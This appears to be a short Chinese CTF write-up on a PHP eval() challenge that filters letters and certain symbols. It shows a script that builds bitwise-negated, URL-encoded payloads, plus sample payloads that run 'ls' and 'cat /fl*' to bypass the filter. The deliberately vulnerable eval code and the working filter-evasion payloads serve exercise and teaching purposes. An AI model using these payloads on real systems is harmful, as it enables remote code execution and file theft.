#RCE 

```php
<?php   
	header("Content-Type:text/html;charset=utf-8");   
	error_reporting(0);   
	highlight_file(__FILE__);   
	if(isset($_GET['wllm']))
	{    
		$wllm = $_GET['wllm'];    
		$blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];       
		foreach ($blacklist as $blackitem)       {           if (preg_match('/' . $blackitem . '/m', $wllm)) {           
			die("LTLT说不能用这些奇奇怪怪的符号哦！");       
		}
	}   
	if(preg_match('/[a-zA-Z]/is',$wllm))   {       
		die("Ra's Al Ghul说不能用字母哦！");   
	}   
	echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";   
	eval($wllm);   }   
	else   {       
	echo "蔡总说：注意审题！！！";   }   
?>
```

[无字母数字绕过正则表达式总结含上传临时文件、异或、或、取反、自增脚本](https://blog.csdn.net/miuzzx/article/details/109143413)


无字母 RCE
本题可以取反
取反PHP脚本
```php
<?php
fwrite(STDOUT, '[+]your function: ');
$system = str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
fwrite(STDOUT, '[+]your command: ');
$command = str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
echo '[*] (~' . urlencode(~$system) . ')(~' . urlencode(~$command) . ');';
```

参考
[一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

#### 取反(~)
```php
<?php
$a = 'system';
$b = 'cat /fl*';
$ak = urlencode(~$a);
$bk = urlencode(~$b);
echo '(' . '~' . $ak . ')' . '(' . '~' . $bk . ')';
```

```php
system('ls');
// (~%8C%86%8C%8B%9A%92)(~%93%8C);
system('cat /fl*');
// (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%D5);
```

[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_数字绕过+_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109143413)
